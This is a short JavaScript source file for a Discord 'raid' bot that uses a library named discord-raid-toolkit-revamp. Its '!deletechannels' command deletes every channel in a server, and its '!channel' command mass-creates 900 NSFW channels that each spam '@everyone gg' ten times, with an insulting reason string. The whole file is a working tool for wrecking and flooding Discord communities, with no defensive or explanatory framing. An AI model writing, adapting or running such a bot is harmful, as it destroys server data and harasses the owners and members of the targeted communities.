
const client = new Discord.Client() //setting/creating a new discord client (bot)
const mySecret = process.env['TOKEN']
const { keep_alive } = require("./keep_alive");

const Disc_rd = require('discord-raid-toolkit-revamp')
const raid = new Disc_rd.RaidBot(client)

client.on('message', async message => {
    if(message.content.startsWith('!deletechannels')) {
        await raid.deleteAllChannels(message.guild.id)
    }
})

client.on('message', message => {
    if(message.content.startsWith('!channel')) {
        raid.createChannelsLoop(message.guild.id, {
            amount_of_created_channels: 900,
            message_that_will_be_sent: "@everyone gg",
            times_message_is_sent: 10,
            channels_name: "GG MSC",
            reason_channels: "MSC YOUR FUCKED",
            channels_topic: "MSC",
            nsfw: true,
            channel_cooldown: 10
        })
    }
})

client.login(process.env.TOKEN);
